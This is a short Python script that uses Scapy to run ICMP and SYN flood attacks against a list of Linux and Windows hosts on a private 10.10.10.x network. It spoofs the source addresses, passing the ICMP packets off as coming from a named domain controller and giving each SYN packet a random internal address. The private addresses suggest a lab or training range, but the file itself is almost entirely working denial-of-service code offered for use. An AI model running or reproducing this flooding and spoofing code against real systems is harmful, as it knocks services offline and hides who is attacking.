from scapy.layers import inet
from scapy.sendrecv import send
import threading
import time
import random

DOMAIN_CONTROLLER_IP = "10.10.10.21"

LINUX_TARGET_IPS = ["10.10.10.101", "10.10.10.102", "10.10.10.103", "10.10.10.104"]
WINDOWS_TARGET_IPS = ["10.10.10.21", "10.10.10.22", "10.10.10.23"]

def random_ip_generator():
    c = random.randint(1, 254)
    d = random.randint(1, 254)
    return "10.10." + str(c) + "." + str(d)

def icmp_flood_work(p):
    while True:
        send(p, verbose=False)
        time.sleep(random.randrange(30)/1000)

def icmp_flood(target_host):
    packet = inet.IP(dst=target_host, src=DOMAIN_CONTROLLER_IP) / inet.ICMP()
    t = threading.Thread(target=icmp_flood_work, args=(packet,), daemon=True)
    t.start()
    return t

def syn_flood_work(target_host):
    while True:
        packet = inet.IP(dst=target_host, src=random_ip_generator()) / inet.TCP(sport=random.randint(1024, 65535), dport=random.randint(1, 1000), flags="S")
        send(packet, verbose=False)
        time.sleep(random.randrange(30)/1000)

def syn_flood(target_host):
    t = threading.Thread(target=syn_flood_work, args=(target_host,), daemon=True)
    t.start()
    return t

def main():
    icmp_threads = []
    syn_threads = []
    for ip in LINUX_TARGET_IPS + WINDOWS_TARGET_IPS:
        icmp_threads.append(icmp_flood(ip))
        syn_threads.append(syn_flood(ip))
    ...

if __name__ == "__main__":
    main()